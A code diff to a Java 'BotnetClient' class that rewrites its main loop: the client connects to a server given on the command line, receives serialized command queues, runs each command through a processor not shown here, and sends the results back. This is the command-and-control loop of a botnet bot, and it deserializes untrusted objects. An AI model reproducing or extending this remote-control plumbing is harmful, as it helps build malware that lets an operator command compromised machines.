@@ -26,65 +26,119 @@ public class BotnetClient{
         int portNumber = Integer.parseInt(args[1]);
 
         //bind the streams
-        try{
+    //     try{
+    //         socket = new Socket(hostName, portNumber);
+    //         out = new ObjectOutputStream(socket.getOutputStream());
+    //         in = new ObjectInputStream(socket.getInputStream());
+    //         inQueue = (CommandQueue) in.readObject();
+    //     } catch (UnknownHostException e) {
+    //         System.err.println("[-]Don't know about host " + hostName);
+    //         System.exit(1);
+    //     } catch (IOException e) {
+    //         System.err.println("[-]Couldn't get I/O for the connection to " +
+    //             hostName);
+    //         System.exit(1);
+    //     } catch (ClassNotFoundException e){
+    //         System.err.println("[-]IMClient Class not found");
+    //         System.exit(1);
+    //     }
+
+    //     //While there are commands being sent from the server
+        
+    //         while(inQueue!=null){
+    //             inCommand = inQueue.take();
+                
+    //             System.out.println("[+]Running Command " + inCommand.getCommandName());
+                
+    //             //get result from processing command
+    //             String result = commandP.processCommand(inCommand);
+                
+    //             /**Debug prints */
+    //             // System.out.println("[*]Command Result: " + result);
+    //             // System.out.println("[*]Command Response: " + inCommand.getResponse());
+    //             // System.out.println("[*]Command Error Status: " + inCommand.getErrorStatus());
+    //             // System.out.println("[*]Command Is Executed: " + inCommand.getIsExecuted());
+    //             // System.out.println("[*]Command Is Executed: " + inCommand.getIsExecuted());
+                
+    
+    //             //send command back to server
+    //             inQueue.put(inCommand);
+    //             out.writeObject(inQueue);
+    //             //if the command running had an error then close the connection 
+    //             if (inCommand.getErrorStatus() && inCommand.getIsExecuted()){
+    //                 System.err.println("[-] error bro");
+    //                 // break;
+    //             }
+    
+    //             // try{
+    //             //     //if there was no error
+    //             //     if (!inCommand.getErrorStatus())
+    //             //         //get the next command
+    //             //         inQueue = (CommandQueue) in.readObject();
+    //             // }
+    //             // catch (ClassNotFoundException cnfe){
+    //             //     System.err.println("[-]BotNetClient: Problem reading object: class not found");
+    //             //     System.err.println(cnfe);
+    //             //     System.exit(1);
+    //             // }
+    //             // //close streams
+    //             // inQueue = null;
+    //         }
+    //         out.close();
+    //         in.close();
+    //         socket.close();
+        
+    // }    
+
+        // Bind the streams
+        try {
             socket = new Socket(hostName, portNumber);
             out = new ObjectOutputStream(socket.getOutputStream());
             in = new ObjectInputStream(socket.getInputStream());
-            inQueue = (CommandQueue) in.readObject();
         } catch (UnknownHostException e) {
-            System.err.println("[-]Don't know about host " + hostName);
+            System.err.println("[-] Don't know about host " + hostName);
             System.exit(1);
         } catch (IOException e) {
-            System.err.println("[-]Couldn't get I/O for the connection to " +
-                hostName);
-            System.exit(1);
-        } catch (ClassNotFoundException e){
-            System.err.println("[-]IMClient Class not found");
+            System.err.println("[-] Couldn't get I/O for the connection to " + hostName);
             System.exit(1);
         }
 
-        //While there are commands being sent from the server
-        while(inQueue!=null){
-            inCommand = inQueue.take();
-            
-            System.out.println("[+]Running Command " + inCommand.getCommandName());
-            
-            //get result from processing command
-            String result = commandP.processCommand(inCommand);
-            
-            /**Debug prints */
-            // System.out.println("[*]Command Result: " + result);
-            // System.out.println("[*]Command Response: " + inCommand.getResponse());
-            // System.out.println("[*]Command Error Status: " + inCommand.getErrorStatus());
-            // System.out.println("[*]Command Is Executed: " + inCommand.getIsExecuted());
-            // System.out.println("[*]Command Is Executed: " + inCommand.getIsExecuted());
-            
+        try {
+            // Main loop to receive and process commands from the server
+            while (true) {
+                // Receive the command queue from the server
+                inQueue = (CommandQueue) in.readObject();
+                if (inQueue == null) {
+                    System.out.println("[-] Server closed the connection.");
+                    break;
+                }
 
-            //send command back to server
-            inQueue.put(inCommand);
-            out.writeObject(inQueue);
-            //if the command running had an error then close the connection 
-            if (inCommand.getErrorStatus() && inCommand.getIsExecuted()){
-                System.err.println("[-] error bro");
-                // break;
+                // Process each command in the queue
+                Command command = inQueue.take();
+                    System.out.println("[+] Running Command " + command.getCommandName());
+
+                    // Process the command
+                    String result = commandP.processCommand(command);
+
+                    // Update the command with the result
+                    command.setResponse(result);
+                
+
+                // Send back the updated queue to the server
+                out.writeObject(inQueue);
+                out.flush();
             }
-
-            // try{
-            //     //if there was no error
-            //     if (!inCommand.getErrorStatus())
-            //         //get the next command
-            //         inQueue = (CommandQueue) in.readObject();
-            // }
-            // catch (ClassNotFoundException cnfe){
-            //     System.err.println("[-]BotNetClient: Problem reading object: class not found");
-            //     System.err.println(cnfe);
-            //     System.exit(1);
-            // }
-            // //close streams
-            // out.close();
-            // in.close();
-            // socket.close();
-            inQueue = null;
+        } catch (ClassNotFoundException e) {
+            System.err.println("[-] BotNetClient: Problem reading object: class not found");
+            e.printStackTrace();
+        } catch (EOFException e) {
+            System.err.println("[-] Connection closed by server.");
+        } finally {
+            // Close the streams and socket
+            if (in != null) in.close();
+            if (out != null) out.close();
+            if (socket != null) socket.close();
         }
-    }    
+    }
 }
+
